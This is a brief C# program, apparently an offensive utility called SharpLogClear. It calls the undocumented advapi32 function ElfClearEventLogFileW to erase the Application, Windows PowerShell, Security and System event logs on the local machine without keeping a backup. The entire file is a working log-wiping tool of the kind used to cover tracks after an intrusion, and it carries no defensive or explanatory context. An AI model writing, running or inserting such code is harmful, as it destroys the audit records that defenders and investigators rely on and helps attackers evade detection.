using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Security.Principal;



namespace SharpLogClear
{
	class Program
	{
		[DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
		public static extern IntPtr OpenEventLogW(
			String lpUNCServerName,
			String lpSourceName);
		[DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
		public static extern void ElfClearEventLogFileW(
			IntPtr LogHandle,
			String BackupFileName);
		[DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
		public static extern void CloseEventLog(
			IntPtr LogHandle);
		static void Main(string[] args)
		{
			IntPtr logHandle = OpenEventLogW("", "Application");
			ElfClearEventLogFileW(logHandle, "");
			CloseEventLog(logHandle);

			IntPtr logHandle2 = OpenEventLogW("", "Windows PowerShell");
			ElfClearEventLogFileW(logHandle2, "");
			CloseEventLog(logHandle2);

			IntPtr logHandle3 = OpenEventLogW("", "Security");
			ElfClearEventLogFileW(logHandle3, "");
			CloseEventLog(logHandle3);

			IntPtr logHandle4 = OpenEventLogW("", "System");
			ElfClearEventLogFileW(logHandle4, "");
			CloseEventLog(logHandle4);

		}
	}
}
